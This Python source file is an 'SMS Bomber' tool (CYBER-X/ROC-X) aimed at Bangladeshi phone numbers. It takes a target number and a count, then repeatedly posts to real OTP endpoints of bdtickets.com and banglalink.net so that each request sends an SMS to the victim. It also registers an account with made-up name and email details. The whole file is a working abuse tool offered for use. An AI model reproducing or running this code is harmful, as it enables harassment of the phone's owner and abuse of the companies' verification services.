import os
import requests
import time

# CVALUE
blue = '\33[94m'
lightblue = '\033[94m'
red = '\033[91m'
white = '\33[97m'
yellow = '\33[93m'
green = '\033[1;32m'
cyan = "\033[96m"
end = '\033[0m'
line = yellow + "======================================================================================================================"
space = " "
logo = red + str("""
     8888888888  YY      YY  888888     889090909  8888888         88       88     
     8yyyyyyyyy   YY    YY   89    89   88         88     88        88     88
     88            YY  YY    98      9  88         88     88         88   88
     88              YY      898999099  8890909    8888888     88888   888
     88              YY      989999788  8899090    8888        88888   888
     88              88      89      8  88         88  88            88   88
     8yyyyyyyyy      88      89    78   88         88    88         88     88
     8888888888      58      898888     888989899  88      88      88       88                     
""")

# HEADER
text = cyan + "\t\tDeveloped By : Shahed Noor" + green + "\n\n\t\t★★ ROC-X BD SMS Bomber ★★   \n"
notice = ""


def header():
    print(logo)
    print(text)
    print(line)
    print(notice)


# SELECT_MAIN
def opt():
    print(cyan + "\n==> Select Your Option From Below")
    print(yellow + "\n\n [1] Start BD SMS Bombing\n\n [2] Back to CYBER-X")


# MAIN_TOOL
try:
    os.system('clear')
except:
    os.system('cls')
tt = 1
header()
opt()
while tt < 2:
    opt2 = str(input(blue + "\n\n [>] Enter the number of option : " + yellow))
    if opt2 == "1":
        text = cyan + "\t\tDeveloped By : Shahed Noor" + green + "\n\n\t\t★★ CYBER-X BD SMS Bomber ★★   \n"
        try:
            os.system('clear')
        except:
            os.system('cls')
        header()
        number = str(input(blue + "\n\n [>] Enter The BD Number : " + yellow))
        ammount = int(input(blue + "\n [>] Enter The Ammount : " + yellow))
        os.system('clear')
        notice = cyan + "\n\t   [•] CYBER-X Tools in progress......\n\n"
        header()
        ammount2 = 1
        totalsent = 0
        totalnotsent = 0
        import requests
        from requests.structures import CaseInsensitiveDict

        url = "https://api.bdtickets.com:20100/v1/user"

        headers = CaseInsensitiveDict()
        headers["Content-Type"] = "application/json"
        data = "{\"phoneNumber\":\"+88" + number + "\",\"firstName\":\"asijfjyff\",\"givenName\":\"asif\",\"email\":\"nasagkfkfasni@gmail.com\",\"locale\":\"EN\",\"sendOtp\":true,\"debug\":false}"
        resp = requests.post(url, headers=headers, data=data)

        while ammount2 < ammount + 1:
            try:
                if "0111" in number or "019" in number:
                    r = requests.post("https://assetliteapi.banglalink.net/api/v1/user/otp-login/request",
                                      data={"mobile": number})

                else:
                    import requests
                    from requests.structures import CaseInsensitiveDict

                    url = "https://api.bdtickets.com:20100/v1/auth"

                    headers = CaseInsensitiveDict()
                    headers["Content-Type"] = "application/json"
                    data = "{\"phoneNumber\":\"+88" + number + "\"}"

                    resp = requests.post(url, headers=headers, data=data)

                if ammount2 == 1:
                    print(cyan + "\n\t  ★★CYBER-X★★==>   " + green + "[✓] 1st SMS Sent.")
                elif ammount2 == 2:
                    print(cyan + "\n\t  ★★CYBER-X★★==>   " + green + "[✓] 2nd SMS Sent.")
                elif ammount2 == 3:
                    print(cyan + "\n\t  ★★CYBER-X★★==>   " + green + "[✓] 3rd SMS Sent.")
                else:
                    print(cyan + "\n\t  ★★CYBER-X★★==>   " + green + "[✓] " + str(ammount2) + "th SMS Sent.")
                time.sleep(1)
                totalsent += 1
                ammount2 += 1
            except:
                if ammount2 == 1:
                    print(cyan + "\n\t  ★★CYBER-X★★==>   " + red + "[×] 1st SMS Not Sent.")
                elif ammount2 == 2:
                    print(cyan + "\n\t  ★★CYBER-X★★==>   " + red + "[×] 2nd SMS Not Sent.")
                elif ammount2 == 3:
                    print(cyan + "\n\t  ★★CYBER-X★★==>   " + red + "[×] 3rd SMS Not Sent.")
                else:
                    print(cyan + "\n\t  ★★CYBER-X★★==>   " + red + "[×] " + str(ammount2) + "th SMS Not Sent.")
                    time.sleep(10)
                    ammount2 += 1

        totalhit = ammount2 - 1
        totalnotsent = totalhit - totalsent
        print(cyan + "\n\n\t\t[•] Total Hits : " + yellow + str(totalhit))
        print(green + "\n\t\t[✓] Total Sent : " + yellow + str(totalsent))
        print(red + "\n\t\t[×] Total Not Sent : " + yellow + str(totalnotsent) + "\n")
        lastt = str(input(cyan + "\n\n\t\t  [✓] All Done!\n\t [•] Now Press Enter Key To Continue\n"))
        os.system('clear')
        notice = ""
        text = green + "\n\n\t\t★★★CYBER-X SMS Tools★★★   \n"
        header()
        opt()


    elif opt2 == "2":
        os.system("python3 main2.py")
    else:
        text = cyan + "\t\tDeveloped By : Shahed Noor" + green + "\n\n\t\t★★ CYBER-X BD SMS Bomber ★★   \n"
        notice = red + "\n\t\t[×] Wrong Value Entered"
        try:
            os.system('clear')
        except:
            os.system('cls')
        header()
        opt()
        continue
